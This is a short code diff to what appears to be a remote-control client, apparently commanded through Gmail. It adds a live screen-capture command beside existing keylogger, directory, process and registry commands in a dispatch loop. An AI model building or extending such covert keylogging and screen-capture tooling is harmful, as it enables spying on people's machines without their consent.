@@ -3,6 +3,7 @@ import app_process_server_gmail as ap
 import shutdown_logout_server_gmail as sl
 import directory_tree_server_gmail as dt
 import registry_server_gmail as rs
+import live_screen_server_gmail as ls
 import gmail as g
 import uuid
 
@@ -25,6 +26,9 @@ def directory_tree():
 def registry():
     rs.registry()
     return
+def live_screen():
+    ls.capture_screen()
+    return
 
 def Connect():
     while True:
@@ -37,8 +41,8 @@ def Connect():
             key_logger()
         elif "DIRECTORY" in cmd:
             directory_tree()
-        # elif "LIVESCREEN" in cmd:
-        #     live_screen()
+        elif "LIVESCREEN" in cmd:
+            live_screen()
         elif "APP_PRO" in cmd:
             app_process()       
         elif "REGISTRY" in cmd:
